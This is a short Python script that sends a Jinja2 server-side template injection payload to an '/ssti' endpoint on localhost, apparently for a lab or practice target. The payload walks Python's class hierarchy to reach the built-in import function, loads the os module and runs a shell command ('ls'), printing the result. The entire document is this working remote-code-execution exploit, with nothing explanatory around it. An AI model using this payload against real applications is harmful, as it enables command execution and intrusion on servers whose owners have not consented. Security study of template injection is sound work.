import requests
import pickle

url = "http://localhost:5000/ssti?name={% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{% endfor %}"
response = requests.get(url)
print(response.text)